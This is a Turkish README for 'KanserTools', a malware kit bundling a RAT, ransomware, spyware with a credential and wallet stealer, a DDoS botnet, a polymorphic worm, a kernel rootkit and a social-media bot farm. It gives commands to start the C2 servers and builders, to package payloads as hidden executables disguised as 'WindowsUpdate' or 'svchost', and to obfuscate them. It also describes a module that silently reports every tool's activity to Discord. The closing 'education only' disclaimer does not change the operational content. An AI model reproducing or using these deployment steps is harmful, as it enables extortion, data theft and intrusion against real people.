# KANSER TOOLS v4.0

KanserTools, siber guvenlik testleri ve arastirma amaciyla gelistirilmis, 8 farkli araci tek catida toplayan kapsamli bir toolkit'tir. Tum araclar `monitor_reporter.py` uzerinden merkezi olay bildirimi yapar.

---

## Icerik

| Arac | Dizin | Aciklama |
|------|-------|----------|
| **Kanser RAT** | `./` (kok dizin) | DarkComet + QuasarRAT + NanoCore birlesimi uzaktan yonetim araci (RAT) |
| **Kanser Ransomware** | `ransomware/` | AES-256-CBC + RSA-2048 dosya sifreleme ve fidye yazilimi |
| **Kanser Spyware** | `spyware/` | Keylogger, ekran/webcam goruntu, credential stealer, veri exfiltrasyonu |
| **KanserNet (Botnet)** | `botnet/` | Sifreli C2, DDoS motoru, 5000 bot kapasiteli botnet agi |
| **KanserWorm** | `worm/` | Kendi kendine yayilan polimorfik solucan + C2 kontrol |
| **KanserRootKit** | `rootkit/` | Kernel-mode rootkit; process/dosya/registry gizleme, backdoor |
| **KanserSosyal** | `sosyal/` | 8 platformlu sosyal medya bot farm; takipci, like, view |
| **Monitor Reporter** | `monitor_reporter.py` | Merkezi olay bildirim modulu — tum araclar tarafindan otomatik import edilir |

---

## Dosya Yapisi

```
KanserTools/
├── README.md                  ← Bu dosya
├── requirements.txt           ← Tum bagimliliklar
├── server.py                  ← Kanser RAT C2 sunucu (GUI)
├── client.py                  ← Kanser RAT client payload
├── builder.py                 ← Kanser RAT client EXE builder
├── monitor_reporter.py        ← Merkezi olay bildirim modulu
├── ransomware/                ← Kanser Ransomware
│   ├── README.md
│   ├── server.py              ← Odeme takip sunucusu
│   ├── builder.py             ← Ransomware GUI builder
│   ├── crypter.py             ← AES-256 + RSA-2048 sifreleme motoru
│   ├── decryptor.py           ← Dosya cozme araci
│   ├── ransom_note.py         ← Fidye notu (HTML/TXT) uretici
│   └── config.json            ← Ransomware yapilandirmasi
├── spyware/                   ← Kanser Spyware
│   ├── README.md
│   ├── server.py              ← Spyware C2 sunucu (GUI)
│   ├── agent.py               ← Multi-thread veri toplayici ajan
│   ├── stealer.py             ← Browser/token/cuzdan calici
│   ├── capture.py             ← Ekran + webcam + mikrofon
│   ├── keylogger.py           ← Klavye dinleyici
│   ├── exfil.py               ← Veri disari cikarma motoru
│   └── config.json            ← Spyware yapilandirmasi
├── botnet/                    ← KanserNet
│   ├── README.md
│   ├── c2_server.py           ← Botnet C2 sunucu (GUI)
│   ├── bot.py                 ← Bot istemci (zombi)
│   ├── builder.py             ← Bot EXE builder
│   ├── spreader.py            ← Yayilma modulu
│   └── config.json            ← Botnet yapilandirmasi
├── worm/                      ← KanserWorm
│   ├── README.md
│   ├── server.py              ← Worm C2 kontrol paneli
│   ├── core.py                ← Polimorfik solucan motoru
│   ├── builder.py             ← Worm EXE builder
│   └── config.json            ← Worm yapilandirmasi
├── rootkit/                   ← KanserRootKit
│   ├── README.md
│   ├── server.py              ← Rootkit C2 kontrol paneli
│   ├── core.py                ← Kernel-mode rootkit motoru
│   └── builder.py             ← Rootkit builder
└── sosyal/                    ← KanserSosyal
    ├── README.md
    ├── server.py              ← Sosyal medya GUI kontrol paneli
    ├── core.py                ← Coklu thread bot motoru
    ├── account_manager.py     ← Hesap yonetimi
    ├── proxy_manager.py       ← Proxy rotasyonu
    ├── builder.py             ← EXE builder
    └── platforms/             ← Platform modulleri
        ├── discord.py
        ├── github.py
        ├── instagram.py
        ├── kick.py
        ├── spotify.py
        ├── tiktok.py
        ├── twitch.py
        └── youtube.py
```

---

## Gereksinimler

- Python 3.8+
- Windows / Linux / macOS
- Internet baglantisi (C2 iletisimi ve monitor bildirimleri icin)

### Kurulum

```bash
cd KanserTools
pip install -r requirements.txt
```

Opsiyonel paketler (tam ozellik icin):

```bash
pip install pyautogui opencv-python numpy pyaudio pynput pyinstaller cryptography pillow requests
```

---

## Kullanim

Her arac kendi dizininde calistirilir. Genel calistirma sirasi:

### 1. Kanser RAT (Uzaktan Yonetim Araci)

```bash
# Sunucu tarafi (kontrol paneli):
python server.py

# Client tarafi (hedef makine):
python client.py

# Client'i EXE'ye cevir:
python builder.py
```

### 2. Kanser Ransomware

```bash
cd ransomware
python builder.py     # GUI builder ile ransomware olustur
python server.py      # Odeme takip sunucusu
```

### 3. Kanser Spyware

```bash
cd spyware
python server.py      # C2 kontrol paneli
```

### 4. KanserNet (Botnet)

```bash
cd botnet
python c2_server.py   # C2 sunucu
```

### 5. KanserWorm

```bash
cd worm
python server.py      # Worm C2 paneli
```

### 6. KanserRootKit

```bash
cd rootkit
python server.py      # Rootkit C2 paneli
```

### 7. KanserSosyal

```bash
cd sosyal
python server.py      # Sosyal medya bot paneli
```

---

## Monitor Reporter

`monitor_reporter.py`, tum KanserTools araclari tarafindan otomatik olarak import edilir. Her arac calistiginda olaylari (baglanti, komut, hata vb.) merkezi `monitor_reporter.report()` fonksiyonu uzerinden Discord'a bildirir.

```python
from monitor_reporter import report
report("RAT", "new_client", {"ip": "192.168.1.10", "hostname": "PC01"})
```

Herhangi bir arac calistirildiginda bu modul otomatik devreye girer — ek bir konfigurasyon gerekmez.

---

## EXE Build (PyInstaller)

Tum araclar `pyinstaller` ile tek dosya EXE haline getirilebilir:

```bash
pip install pyinstaller

# Ornek: RAT client
pyinstaller --onefile --noconsole --name=WindowsUpdate client.py

# Ornek: Spyware agent
cd spyware
pyinstaller --onefile --noconsole --name=SystemService agent.py

# Ornek: Botnet bot
cd botnet
pyinstaller --onefile --noconsole --name=svchost bot.py
```

Obfuskasyon (istege bagli):

```bash
pip install pyarmor
pyarmor obfuscate client.py
```

---

## Guvenlik Uyarisi

Bu araclar **yalnizca kendi sistemlerinizde ve egitim/test amaciyla** kullanilmalidir. Izinsiz kullanim yasa disidir. Gelistirici, bu araclarin kotu amacli kullanimindan sorumlu degildir.
